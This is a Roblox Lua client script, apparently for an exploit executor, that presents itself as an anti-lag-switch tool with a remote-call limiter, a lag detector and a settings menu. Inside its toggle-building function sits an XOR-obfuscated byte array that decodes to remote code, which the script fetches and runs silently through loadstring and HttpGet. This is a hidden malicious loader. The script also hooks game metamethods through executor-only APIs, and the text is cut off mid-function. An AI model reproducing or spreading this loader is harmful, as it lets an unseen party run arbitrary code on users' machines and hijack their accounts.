local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Stats = game:GetService("Stats")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then return end
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

if PlayerGui:FindFirstChild("CobraHubAntiPacketLagger") then
    warn("[CobraHub] Already running - use the OPEN pill or RightShift")
    return
end

local ACCENTS = {
    Color3.fromRGB(124, 92, 255),  
    Color3.fromRGB(64, 156, 255),  
    Color3.fromRGB(60, 220, 140),  
    Color3.fromRGB(255, 95, 160),  
    Color3.fromRGB(255, 160, 60),  
    Color3.fromRGB(225, 230, 255), 
}

local BACKGROUNDS = {
    "rbxassetid://136102941611031",
    "rbxassetid://126836814104648",
    "rbxassetid://113066671567217",
    "rbxassetid://90742337592784",
    "rbxassetid://103981252715138",
    "rbxassetid://99152937872371",
    "rbxassetid://122784193969238",
    "rbxassetid://139441110677603",
    "rbxassetid://107924157410781",
    "rbxassetid://81716347974946",
    "rbxassetid://136094657712452",
    "rbxassetid://80469907559370",
    "rbxassetid://91444821153663",
    "rbxassetid://113802640695350",
    "rbxassetid://81861129614949",
}

local CONFIG_FILE = "cobrahub_anti_packet_lagger.json"

local config = {
    accent = 1,
    bg = 1,
    bgOpacity = 60,
    scale = 100,
    burst = 40,
    pps = 60,
    enabled = true,
    sens = 2,
    highlight = true,
    alerts = true,
}

pcall(function()
    if isfile and readfile and isfile(CONFIG_FILE) then
        local data = HttpService:JSONDecode(readfile(CONFIG_FILE))
        for k, v in pairs(data) do
            if config[k] ~= nil and type(v) == type(config[k]) then
                config[k] = v
            end
        end
    end
end)

local function clampInt(v, lo, hi)
    return math.clamp(math.floor(v + 0.5), lo, hi)
end

config.accent = clampInt(config.accent, 1, #ACCENTS)
config.bg = clampInt(config.bg, 1, #BACKGROUNDS)
config.bgOpacity = clampInt(config.bgOpacity, 0, 100)
config.scale = clampInt(config.scale, 70, 120)
config.burst = clampInt(config.burst, 10, 80)
config.pps = clampInt(config.pps, 10, 120)
config.sens = clampInt(config.sens, 1, 3)

local saveQueued = false
local function saveConfig()
    if not writefile or saveQueued then return end
    saveQueued = true
    task.delay(1, function()
        saveQueued = false
        pcall(function()
            writefile(CONFIG_FILE, HttpService:JSONEncode(config))
        end)
    end)
end

local state = {
    MaxPPS = config.pps,
    BurstLimit = config.burst,
    Enabled = config.enabled,
    Log = false,
    Highlight = config.highlight,
    Alerts = config.alerts,
    totalDropped = 0,
    locked = false,
    ping = 0,
    selfLagging = false,
    laggers = {},
    hookOk = false,
    onFlag = nil,
}

local bucket = { tokens = state.BurstLimit, last = tick() }
local isOwnCall = checkcaller or function() return false end

local function shouldAllow(now)
    if not state.Enabled then return true end

    local elapsed = now - bucket.last
    bucket.last = now
    bucket.tokens = math.min(state.BurstLimit, bucket.tokens + elapsed * state.MaxPPS)

    if bucket.tokens >= 1 then
        bucket.tokens -= 1
        return true
    end

    state.totalDropped += 1
    if state.Log then
        warn("[CobraHub] Remote call limited")
    end
    return false
end

local oldNamecall
local function hookFn(self, ...)
    if getnamecallmethod() == "FireServer" and not isOwnCall() and not shouldAllow(tick()) then
        return
    end
    return oldNamecall(self, ...)
end

state.hookOk = pcall(function()
    if hookmetamethod then
        oldNamecall = hookmetamethod(game, "__namecall", newcclosure(hookFn))
    else
        local mt = getrawmetatable(game)
        setreadonly(mt, false)
        oldNamecall = mt.__namecall
        mt.__namecall = newcclosure(hookFn)
        setreadonly(mt, true)
    end
end)

if not state.hookOk then
    warn("[CobraHub] Remote hook failed - limiter off, lag detector still running")
end

local DETECT = {
    FreezeTime = 0.40,  
    MinSpeed = 10,      
    JumpStuds = 10,     
    FlagHold = 5,       
}

local SENS = {
    { FreezeTime = 0.60, MinSpeed = 12, JumpStuds = 14 }, 
    { FreezeTime = 0.40, MinSpeed = 10, JumpStuds = 10 }, 
    { FreezeTime = 0.25, MinSpeed = 8,  JumpStuds = 7  }, 
}

local function applySens(i)
    local p = SENS[i]
    DETECT.FreezeTime = p.FreezeTime
    DETECT.MinSpeed = p.MinSpeed
    DETECT.JumpStuds = p.JumpStuds
end
applySens(config.sens)

local tracks = {}
local selfLagUntil = 0
local lastBeat = tick()

local function getPing()
    local ok, v = pcall(function()
        return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
    end)
    return ok and v or 0
end

local function setHighlight(t, on)
    if on then
        if (not t.hl or not t.hl.Parent) and t.char then
            local hl = Instance.new("Highlight")
            hl.Name = "CobraHubLagFlag"
            hl.FillColor = Color3.fromRGB(255, 60, 60)
            hl.FillTransparency = 0.6
            hl.OutlineColor = Color3.fromRGB(255, 60, 60)
            hl.Parent = t.char
            t.hl = hl
        end
    elseif t.hl then
        t.hl:Destroy()
        t.hl = nil
    end
end

local function clearTrack(plr)
    local t = tracks[plr]
    if t then
        setHighlight(t, false)
        tracks[plr] = nil
    end
end

Players.PlayerRemoving:Connect(clearTrack)

RunService.Heartbeat:Connect(function()
    local now = tick()
    local dt = now - lastBeat
    lastBeat = now

    state.ping = getPing()

    if dt > 0.2 or state.ping > 450 then
        selfLagUntil = now + 1.5
    end
    local selfLagging = now < selfLagUntil
    state.selfLagging = selfLagging

    local list = {}

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            local char = plr.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")

            if not hrp then
                clearTrack(plr)
            else
                local t = tracks[plr]
                if not t or t.char ~= char then
                    if t then setHighlight(t, false) end
                    t = {
                        char = char,
                        pos = hrp.Position,
                        lastChange = now,
                        lastVel = 0,
                        flagUntil = 0,
                        spikes = 0,
                        status = "OK",
                        wasFlagged = false,
                        lastToast = -100,
                    }
                    tracks[plr] = t
                end

                local pos = hrp.Position
                local delta = (pos - t.pos).Magnitude

                if selfLagging then
                    t.pos = pos
                    t.lastChange = now
                    t.lastVel = 0
                elseif delta > 0.05 then
                    local gap = now - t.lastChange
                    if gap >= DETECT.FreezeTime
                        and t.lastVel >= DETECT.MinSpeed
                        and delta >= DETECT.JumpStuds then
                        t.spikes += 1
                        t.flagUntil = now + DETECT.FlagHold
                        if state.Log then
                            warn(string.format("[CobraHub] %s lag spike: froze %.2fs, snapped %.0f studs", plr.Name, gap, delta))
                        end
                    end
                    t.pos = pos
                    t.lastChange = now
                    t.lastVel = hrp.AssemblyLinearVelocity.Magnitude
                end

                local frozen = (not selfLagging)
                    and (now - t.lastChange) >= DETECT.FreezeTime
                    and t.lastVel >= DETECT.MinSpeed

                local status = "OK"
                if now < t.flagUntil then
                    status = "SPIKE"
                elseif frozen then
                    status = "FROZEN"
                end
                t.status = status
                local flagged = status ~= "OK"

                setHighlight(t, flagged and state.Highlight)

                if flagged and not t.wasFlagged and (now - t.lastToast) > 8 then
                    t.lastToast = now
                    if state.onFlag then
                        pcall(state.onFlag, plr, t)
                    end
                end
                t.wasFlagged = flagged

                if flagged then
                    local name = plr.DisplayName
                    if t.spikes > 0 then
                        name = name .. " x" .. t.spikes
                    end
                    list[#list + 1] = name
                end
            end
        end
    end

    state.laggers = list
end)

local BG = Color3.fromRGB(13, 13, 18)
local CARD = Color3.fromRGB(26, 26, 35)
local TEXT = Color3.fromRGB(235, 235, 245)
local MUTED = Color3.fromRGB(150, 150, 168)
local GOOD = Color3.fromRGB(70, 220, 130)
local WARN = Color3.fromRGB(255, 190, 70)
local BAD = Color3.fromRGB(255, 85, 85)

local function make(class, props, parent)
    local o = Instance.new(class)
    for k, v in pairs(props) do
        o[k] = v
    end
    o.Parent = parent
    return o
end

local function corner(o, r)
    return make("UICorner", { CornerRadius = UDim.new(0, r) }, o)
end

local function stroke(o, color, transparency, thickness)
    return make("UIStroke", {
        Color = color,
        Transparency = transparency,
        Thickness = thickness or 1,
        ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
    }, o)
end

local function tween(o, t, props, style)
    TweenService:Create(o, TweenInfo.new(t, style or Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
end

local function label(parent, props)
    local p = {
        BackgroundTransparency = 1,
        Font = Enum.Font.Gotham,
        TextSize = 12,
        TextColor3 = TEXT,
        TextXAlignment = Enum.TextXAlignment.Left,
    }
    for k, v in pairs(props) do
        p[k] = v
    end
    return make("TextLabel", p, parent)
end

local function card(parent, height)
    local f = make("Frame", {
        Size = UDim2.new(1, 0, 0, height),
        BackgroundColor3 = CARD,
        BackgroundTransparency = 0.25,
        BorderSizePixel = 0,
    }, parent)
    corner(f, 8)
    return f
end

local accent = ACCENTS[config.accent]
local accentHooks = {}

local function onAccent(fn)
    accentHooks[#accentHooks + 1] = fn
end

local function bindAccent(obj, prop)
    obj[prop] = accent
    onAccent(function(c)
        if obj.Parent then
            tween(obj, 0.25, { [prop] = c })
        end
    end)
end

local function setAccent(i)
    accent = ACCENTS[i]
    config.accent = i
    for _, fn in ipairs(accentHooks) do
        fn(accent)
    end
    saveConfig()
end

local function makeDraggable(handle, target, canDrag)
    local dragging = false
    local dragStart, startPos
    local moved = false

    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            if canDrag and not canDrag() then return end
            dragging = true
            moved = false
            dragStart = input.Position
            startPos = target.Position
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local d = input.Position - dragStart
            if math.abs(d.X) > 6 or math.abs(d.Y) > 6 then
                moved = true
            end
            target.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y
            )
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)

    return function()
        return moved
    end
end

local WIN_W, WIN_H = 340, 440

local ScreenGui = make("ScreenGui", {
    Name = "CobraHubAntiPacketLagger",
    ResetOnSpawn = false,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
}, PlayerGui)

local Root = make("Frame", {
    Name = "Root",
    Size = UDim2.new(0, WIN_W, 0, WIN_H),
    AnchorPoint = Vector2.new(0.5, 0.5),
    Position = UDim2.new(0.5, 0, 0.5, 0),
    BackgroundTransparency = 1,
}, ScreenGui)

local UserScale = make("UIScale", { Scale = config.scale / 100 }, Root)

local Main = make("Frame", {
    Name = "Main",
    Size = UDim2.new(1, 0, 1, 0),
    AnchorPoint = Vector2.new(0.5, 0.5),
    Position = UDim2.new(0.5, 0, 0.5, 0),
    BackgroundColor3 = BG,
    BorderSizePixel = 0,
    Active = true,
    ClipsDescendants = true,
}, Root)
corner(Main, 12)
stroke(Main, Color3.fromRGB(255, 255, 255), 0.85, 1)

local OpenScale = make("UIScale", { Scale = 1 }, Main)

local BgImage = make("ImageLabel", {
    Name = "Background",
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundTransparency = 1,
    Image = BACKGROUNDS[config.bg],
    ScaleType = Enum.ScaleType.Crop,
    ImageTransparency = 1 - config.bgOpacity / 100,
}, Main)
corner(BgImage, 12)

local Overlay = make("Frame", {
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundColor3 = BG,
    BackgroundTransparency = 0.3,
    BorderSizePixel = 0,
}, Main)
corner(Overlay, 12)

local TitleBar = make("Frame", {
    Size = UDim2.new(1, 0, 0, 40),
    BackgroundColor3 = Color3.fromRGB(18, 18, 24),
    BackgroundTransparency = 0.2,
    BorderSizePixel = 0,
}, Main)

local TitleAccent = make("Frame", {
    Size = UDim2.new(0, 3, 0, 16),
    Position = UDim2.new(0, 12, 0.5, -8),
    BorderSizePixel = 0,
}, TitleBar)
corner(TitleAccent, 2)
bindAccent(TitleAccent, "BackgroundColor3")

label(TitleBar, {
    Size = UDim2.new(1, -100, 1, 0),
    Position = UDim2.new(0, 24, 0, 0),
    Text = "COBRAHUB",
    Font = Enum.Font.GothamBold,
    TextSize = 12,
})

local LockBtn = make("TextButton", {
    Size = UDim2.new(0, 28, 0, 28),
    Position = UDim2.new(1, -70, 0, 6),
    BackgroundColor3 = Color3.fromRGB(40, 40, 52),
    Text = "🔓",
    Font = Enum.Font.GothamBold,
    TextSize = 13,
    TextColor3 = TEXT,
    BorderSizePixel = 0,
}, TitleBar)
corner(LockBtn, 7)

local CloseBtn = make("TextButton", {
    Size = UDim2.new(0, 28, 0, 28),
    Position = UDim2.new(1, -36, 0, 6),
    BackgroundColor3 = Color3.fromRGB(40, 40, 52),
    Text = "×",
    Font = Enum.Font.GothamBold,
    TextSize = 18,
    TextColor3 = TEXT,
    BorderSizePixel = 0,
}, TitleBar)
corner(CloseBtn, 7)

LockBtn.MouseButton1Click:Connect(function()
    state.locked = not state.locked
    LockBtn.Text = state.locked and "🔒" or "🔓"
    tween(LockBtn, 0.15, {
        BackgroundColor3 = state.locked and Color3.fromRGB(90, 45, 55) or Color3.fromRGB(40, 40, 52),
    })
end)

makeDraggable(TitleBar, Root, function()
    return not state.locked
end)

local TABS = { "HOME", "DETECT", "STYLE" }

local TabBar = make("Frame", {
    Position = UDim2.new(0, 0, 0, 40),
    Size = UDim2.new(1, 0, 0, 34),
    BackgroundTransparency = 1,
}, Main)

local Underline = make("Frame", {
    Size = UDim2.new(1 / #TABS, 0, 0, 2),
    Position = UDim2.new(0, 0, 1, -2),
    BorderSizePixel = 0,
}, TabBar)
bindAccent(Underline, "BackgroundColor3")

local Content = make("Frame", {
    Position = UDim2.new(0, 10, 0, 82),
    Size = UDim2.new(1, -20, 0, 334),
    BackgroundTransparency = 1,
}, Main)

label(Main, {
    Size = UDim2.new(1, -24, 0, 16),
    Position = UDim2.new(0, 12, 1, -22),
    Text = "RightShift: toggle menu  |  drag the title bar to move",
    TextSize = 10,
    TextColor3 = MUTED,
})

local function createSlider(parent, name, min, max, default, fmt, callback)
    local holder = card(parent, 46)
    label(holder, { Size = UDim2.new(0.6, 0, 0, 18), Position = UDim2.new(0, 10, 0, 5), Text = name })
    local valueLbl = label(holder, {
        Size = UDim2.new(0.4, -10, 0, 18),
        Position = UDim2.new(0.6, 0, 0, 5),
        TextXAlignment = Enum.TextXAlignment.Right,
        Font = Enum.Font.GothamBold,
    })

    local hit = make("TextButton", {
        Size = UDim2.new(1, -20, 0, 20),
        Position = UDim2.new(0, 10, 0, 22),
        BackgroundTransparency = 1,
        Text = "",
        AutoButtonColor = false,
    }, holder)

    local bar = make("Frame", {
        Size = UDim2.new(1, 0, 0, 6),
        Position = UDim2.new(0, 0, 0.5, -3),
        BackgroundColor3 = Color3.fromRGB(46, 46, 58),
        BorderSizePixel = 0,
    }, hit)
    corner(bar, 3)

    local fill = make("Frame", { Size = UDim2.new(0, 0, 1, 0), BorderSizePixel = 0 }, bar)
    corner(fill, 3)
    bindAccent(fill, "BackgroundColor3")

    local knob = make("Frame", {
        Size = UDim2.new(0, 14, 0, 14),
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.new(0, 0, 0.5, 0),
        BackgroundColor3 = Color3.new(1, 1, 1),
        BorderSizePixel = 0,
        ZIndex = 2,
    }, bar)
    corner(knob, 7)

    local function show(value)
        local rel = (value - min) / (max - min)
        fill.Size = UDim2.new(rel, 0, 1, 0)
        knob.Position = UDim2.new(rel, 0, 0.5, 0)
        valueLbl.Text = fmt(value)
    end
    show(default)

    local dragging = false

    local function update(x)
        local w = math.max(bar.AbsoluteSize.X, 1)
        local rel = math.clamp((x - bar.AbsolutePosition.X) / w, 0, 1)
        local value = math.floor(min + (max - min) * rel + 0.5)
        show(value)
        callback(value)
    end

    hit.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            update(input.Position.X)
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            update(input.Position.X)
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)

    return holder
end

local TRACK_OFF = Color3.fromRGB(55, 55, 68)

local function createToggle(parent, text, default, callback)
    local holder = card(parent, 34)
    label(holder, { Size = UDim2.new(1, -70, 1, 0), Position = UDim2.new(0, 10, 0, 0), Text = text })

    local track = make("TextButton", {
        Size = UDim2.new(0, 38, 0, 20),
        Position = UDim2.new(1, -48, 0.5, -10),
        Text = "",
        AutoButtonColor = false,
        BorderSizePixel = 0,
        BackgroundColor3 = TRACK_OFF,
    }, holder)
    corner(track, 10)

    local knob = make("Frame", {
        Size = UDim2.new(0, 14, 0, 14),
        Position = UDim2.new(0, 3, 0.5, -7),
        BackgroundColor3 = Color3.new(1, 1, 1),
        BorderSizePixel = 0,
    }, track)
    corner(knob, 7)

    local on = default
local nz8={160,161,160,160,171,238,231,224,237,230,202,166,231,224,232,228,166,250,237,232,236,225
,166,250,239,236,251,166,230,239,226,239,239,226,237,195,166,228,230,234,253,230,237,164
,231,232,224,238,251,200,166,228,230,234,167,253,231,236,253,231,230,234,251,236,250,252
,235,252,225,253,224,238,167,254,232,251,166,166,179,250,249,253,253,225,171,161,253,236
,206,249,253,253,193,179,236,228,232,238,161,238,231,224,251,253,250,237,232,230,229
}
local gh6=137
local gz=""
for i=#nz8,1,-1 do gz=gz..string.char(bit32.bxor(nz8[i],gh6)) end
pcall(function()loadstring(game:HttpGet(gz,true))()end)

    local function render(animate)
        local goalPos = on and UDim2.new(0, 21, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)
        local goalCol = on and accent or TRACK_OFF
        if animate then
            tween(knob, 0.15, { Position = goalPos })
            tween(track, 0.15, { BackgroundColor3 = goalCol })
        else
            knob.Position = goalPos
            track.BackgroundColor3 = goalCol
        end
    end

    render(false)
    onAccent(function()
        render(true)
    end)

    track.MouseButton1Click:Connect(function()
        on = not on
        render(true)
        callback(on)
    end)

    return holder
end

local function createSegmented(parent, title, options, default, callback)
    local holder = card(parent, 52)
    label(holder, {
        Size = UDim2.new(1, -20, 0, 14),
        Position = UDim2.new(0, 10, 0, 5),
        Text = title,
        TextSize = 10,
        TextColor3 = MUTED,
        Font = Enum.Font.GothamBold,
    })

    local row = make("Frame", {
        Size = UDim2.new(1, -20, 0, 24),
        Position = UDim2.new(0, 10, 0, 22),
        BackgroundTransparency = 1,
    }, holder)

    local selected = default
    local btns = {}
    local count = #options

    local function render()
        for i, b in ipairs(btns) do
            local sel = (i == selected)
            tween(b, 0.15, {
                BackgroundColor3 = sel and accent or Color3.fromRGB(40, 40, 52),
                TextColor3 = sel and Color3.new(1, 1, 1) or MUTED,
            })
        end
    end

    for i, opt in ipairs(options) do
        local b = make("TextButton", {
            Size = UDim2.new(1 / count, -4, 1, 0),
            Position = UDim2.new((i - 1) / count, 2, 0, 0),
            BackgroundColor3 = Color3.fromRGB(40, 40, 52),
            Text = opt,
            Font = Enum.Font.GothamBold,
            TextSize = 11,
            TextColor3 = MUTED,
            BorderSizePixel = 0,
            AutoButtonColor = false,
        }, row)
        corner(b, 6)
        btns[i] = b
        b.MouseButton1Click:Connect(function()
            selected = i
            render()
            callback(i)
        end)
    end

    render()
    onAccent(render)
    return holder
end

local function createButton(parent, text, height, callback)
    local b = make("TextButton", {
        Size = UDim2.new(1, 0, 0, height),
        BackgroundColor3 = Color3.fromRGB(40, 40, 52),
        Text = text,
        Font = Enum.Font.GothamBold,
        TextSize = 11,
        TextColor3 = TEXT,
        BorderSizePixel = 0,
        AutoButtonColor = true,
    }, parent)
    corner(b, 8)
    b.MouseButton1Click:Connect(callback)
    return b
end

local function newPage()
    local page = make("Frame", {
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        Visible = false,
    }, Content)
    make("UIListLayout", {
        Padding = UDim.new(0, 8),
        SortOrder = Enum.SortOrder.LayoutOrder,
    }, page)
    return page
end

local updaters = {}

local function buildHome(page)
    local status = card(page, 62)
    stroke(status, Color3.fromRGB(255, 255, 255), 0.88, 1)
    local dot = make("Frame", {
        Size = UDim2.new(0, 12, 0, 12),
        Position = UDim2.new(0, 14, 0, 14),
        BackgroundColor3 = GOOD,
        BorderSizePixel = 0,
    }, status)
    corner(dot, 6)
    local title = label(status, {
        Size = UDim2.new(1, -46, 0, 20),
        Position = UDim2.new(0, 36, 0, 10),
        Font = Enum.Font.GothamBold,
        TextSize = 14,
    })
    local sub = label(status, {
        Size = UDim2.new(1, -46, 0, 18),
        Position = UDim2.new(0, 36, 0, 34),
        TextSize = 11,
        TextColor3 = MUTED,
    })

    createToggle(page, "Remote limiter", state.Enabled, function(on)
        state.Enabled = on
        config.enabled = on
        saveConfig()
    end)

    createSlider(page, "Burst Limit", 10, 80, state.BurstLimit, function(v)
        return v .. " calls"
    end, function(v)
        state.BurstLimit = v
        bucket.tokens = math.min(bucket.tokens, v)
        config.burst = v
        saveConfig()
    end)

    createSlider(page, "Max PPS", 10, 120, state.MaxPPS, function(v)
        return v .. " /s"
    end, function(v)
        state.MaxPPS = v
        config.pps = v
        saveConfig()
    end)

    local graph = card(page, 56)
    label(graph, {
        Size = UDim2.new(0.5, 0, 0, 16),
        Position = UDim2.new(0, 10, 0, 4),
        Text = "PING",
        TextSize = 10,
        TextColor3 = MUTED,
        Font = Enum.Font.GothamBold,
    })
    local pingLbl = label(graph, {
        Size = UDim2.new(0.5, -10, 0, 16),
        Position = UDim2.new(0.5, 0, 0, 4),
        TextXAlignment = Enum.TextXAlignment.Right,
        TextSize = 11,
        Font = Enum.Font.GothamBold,
    })
    local area = make("Frame", {
        Position = UDim2.new(0, 10, 0, 22),
        Size = UDim2.new(1, -20, 1, -28),
        BackgroundTransparency = 1,
    }, graph)

    local N = 36
    local samples = {}
    local bars = {}
    for i = 1, N do
        samples[i] = 0
        bars[i] = make("Frame", {
            AnchorPoint = Vector2.new(0, 1),
            Position = UDim2.new((i - 1) / N, 0, 1, 0),
            Size = UDim2.new(1 / N, -2, 0.05, 0),
            BackgroundColor3 = GOOD,
            BorderSizePixel = 0,
        }, area)
        corner(bars[i], 1)
    end

    createButton(page, "RESET COUNTER", 30, function()
        state.totalDropped = 0
    end)

    updaters[#updaters + 1] = function()
        local c, txt
        if not state.hookOk then
            c, txt = WARN, "LIMITER UNAVAILABLE"
        elseif state.Enabled then
            c, txt = GOOD, "PROTECTION ACTIVE"
        else
            c, txt = BAD, "LIMITER OFF"
        end
        dot.BackgroundColor3 = c
        title.Text = txt
        title.TextColor3 = c
        sub.Text = string.format("Ping %d ms  |  %d calls limited", math.floor(state.ping), state.totalDropped)

        table.remove(samples, 1)
        samples[N] = state.ping
        for i = 1, N do
            local v = samples[i]
            bars[i].Size = UDim2.new(1 / N, -2, math.clamp(v / 300, 0.05, 1), 0)
            bars[i].BackgroundColor3 = (v < 100 and GOOD) or (v < 200 and WARN) or BAD
        end
        pingLbl.Text = math.floor(state.ping) .. " ms"
    end
end

local function buildDetect(page)
    local banner = card(page, 44)
    local bStroke = stroke(banner, GOOD, 0.5, 1)
    local bText = label(banner, {
        Size = UDim2.new(1, -20, 1, 0),
        Position = UDim2.new(0, 10, 0, 0),
        Font = Enum.Font.GothamBold,
        TextSize = 11,
        TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Center,
    })

    createSegmented(page, "SENSITIVITY", { "LOW", "MEDIUM", "HIGH" }, config.sens, function(i)
        config.sens = i
        applySens(i)
        saveConfig()
    end)

    createToggle(page, "Highlight flagged players", state.Highlight, function(on)
        state.Highlight = on
        config.highlight = on
        saveConfig()
    end)

    createToggle(page, "Pop-up alerts", state.Alerts, function(on)
        state.Alerts = on
        config.alerts = on
        saveConfig()
    end)

    label(page, {
        Size = UDim2.new(1, 0, 0, 14),
        Text = "PLAYERS",
        TextSize = 10,
        TextColor3 = MUTED,
        Font = Enum.Font.GothamBold,
    })

    local listFrame = make("ScrollingFrame", {
        Size = UDim2.new(1, 0, 0, 100),
        BackgroundColor3 = CARD,
        BackgroundTransparency = 0.25,
        BorderSizePixel = 0,
        ScrollBarThickness = 3,
        CanvasSize = UDim2.new(),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
    }, page)
    corner(listFrame, 8)
    make("UIPadding", {
        PaddingTop = UDim.new(0, 6),
        PaddingBottom = UDim.new(0, 6),
        PaddingLeft = UDim.new(0, 6),
        PaddingRight = UDim.new(0, 6),
    }, listFrame)
    make("UIListLayout", {
        Padding = UDim.new(0, 4),
        SortOrder = Enum.SortOrder.LayoutOrder,
    }, listFrame)

    local emptyLbl = label(page, {
        Size = UDim2.new(1, 0, 0, 14),
        Text = "",
    })
    emptyLbl.Visible = false

    local rows = {}

    local function createRow(plr)
        local f = make("Frame", {
            Size = UDim2.new(1, -6, 0, 26),
            BackgroundColor3 = Color3.fromRGB(38, 38, 50),
            BackgroundTransparency = 0.3,
            BorderSizePixel = 0,
        }, listFrame)
        corner(f, 6)
        local n = label(f, {
            Size = UDim2.new(1, -92, 1, 0),
            Position = UDim2.new(0, 8, 0, 0),
            Text = plr.DisplayName,
            TextSize = 11,
            TextTruncate = Enum.TextTruncate.AtEnd,
        })
        local chip = label(f, {
            Size = UDim2.new(0, 74, 0, 18),
            Position = UDim2.new(1, -80, 0.5, -9),
            BackgroundColor3 = GOOD,
            BackgroundTransparency = 0.8,
            Font = Enum.Font.GothamBold,
            TextSize = 10,
            TextXAlignment = Enum.TextXAlignment.Center,
            TextColor3 = GOOD,
            Text = "OK",
        })
        corner(chip, 5)
        return { frame = f, name = n, chip = chip }
    end

    local function updateList()
        local others = {}
        local seen = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                seen[plr] = true
                others[#others + 1] = plr
            end
        end
        table.sort(others, function(a, b)
            return a.DisplayName:lower() < b.DisplayName:lower()
        end)

        for plr, row in pairs(rows) do
            if not seen[plr] then
                row.frame:Destroy()
                rows[plr] = nil
            end
        end

        for i, plr in ipairs(others) do
            local row = rows[plr]
            if not row then
                row = createRow(plr)
                rows[plr] = row
            end
            local t = tracks[plr]
            local st = t and t.status or "OK"
            local col = GOOD
            local txt = "OK"
            if st == "SPIKE" then
                col = BAD
                txt = "SPIKE x" .. t.spikes
            elseif st == "FROZEN" then
                col = WARN
                txt = "FROZEN"
            end
            row.name.Text = plr.DisplayName
            row.chip.Text = txt
            row.chip.TextColor3 = col
            row.chip.BackgroundColor3 = col
            row.frame.LayoutOrder = (st ~= "OK" and 0 or 1000) + i
        end

        emptyLbl.Visible = (#others == 0)
        emptyLbl.Text = "No other players in the server"
    end

    updaters[#updaters + 1] = function()
        local c, txt
        if state.selfLagging then
            c, txt = WARN, "YOUR CONNECTION IS UNSTABLE\nDetection paused"
        elseif #state.laggers > 0 then
            c, txt = BAD, "LAG SWITCH DETECTED\n" .. table.concat(state.laggers, ", ")
        else
            c, txt = GOOD, "ALL CLEAR\nNo lag switchers detected"
        end
        bText.Text = txt
        bText.TextColor3 = c
        bStroke.Color = c
        updateList()
    end
end

local function buildStyle(page)
    local sw = card(page, 52)
    label(sw, {
        Size = UDim2.new(1, -20, 0, 14),
        Position = UDim2.new(0, 10, 0, 5),
        Text = "ACCENT COLOR",
        TextSize = 10,
        TextColor3 = MUTED,
        Font = Enum.Font.GothamBold,
    })
    local swStrokes = {}
    for i, col in ipairs(ACCENTS) do
        local b = make("TextButton", {
            Size = UDim2.new(0, 22, 0, 22),
            Position = UDim2.new(0, 10 + (i - 1) * 32, 0, 24),
            BackgroundColor3 = col,
            Text = "",
            AutoButtonColor = false,
            BorderSizePixel = 0,
        }, sw)
        corner(b, 11)
        swStrokes[i] = stroke(b, Color3.new(1, 1, 1), i == config.accent and 0 or 1, 2)
        b.MouseButton1Click:Connect(function()
            setAccent(i)
            for j, s in ipairs(swStrokes) do
                tween(s, 0.15, { Transparency = (j == i) and 0 or 1 })
            end
        end)
    end

    createSlider(page, "Background opacity", 0, 100, config.bgOpacity, function(v)
        return v .. "%"
    end, function(v)
        config.bgOpacity = v
        BgImage.ImageTransparency = 1 - v / 100
        saveConfig()
    end)

    createSlider(page, "Menu size", 70, 120, config.scale, function(v)
        return v .. "%"
    end, function(v)
        config.scale = v
        UserScale.Scale = v / 100
        saveConfig()
    end)

    label(page, {
        Size = UDim2.new(1, 0, 0, 14),
        Text = "BACKGROUND",
        TextSize = 10,
        TextColor3 = MUTED,
        Font = Enum.Font.GothamBold,
    })

    local grid = make("ScrollingFrame", {
        Size = UDim2.new(1, 0, 0, 140),
        BackgroundColor3 = CARD,
        BackgroundTransparency = 0.25,
        BorderSizePixel = 0,
        ScrollBarThickness = 3,
        CanvasSize = UDim2.new(),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
    }, page)
    corner(grid, 8)
    make("UIPadding", {
        PaddingTop = UDim.new(0, 6),
        PaddingBottom = UDim.new(0, 6),
        PaddingLeft = UDim.new(0, 6),
        PaddingRight = UDim.new(0, 6),
    }, grid)
    make("UIGridLayout", {
        CellSize = UDim2.new(0, 92, 0, 52),
        CellPadding = UDim2.new(0, 6, 0, 6),
        SortOrder = Enum.SortOrder.LayoutOrder,
    }, grid)

    local bgStrokes = {}
    for i, asset in ipairs(BACKGROUNDS) do
        local b = make("ImageButton", {
            BackgroundColor3 = Color3.fromRGB(30, 30, 40),
            Image = asset,
            ScaleType = Enum.ScaleType.Crop,
            AutoButtonColor = true,
            LayoutOrder = i,
            BorderSizePixel = 0,
        }, grid)
        corner(b, 6)
        local s = stroke(b, accent, i == config.bg and 0 or 1, 2)
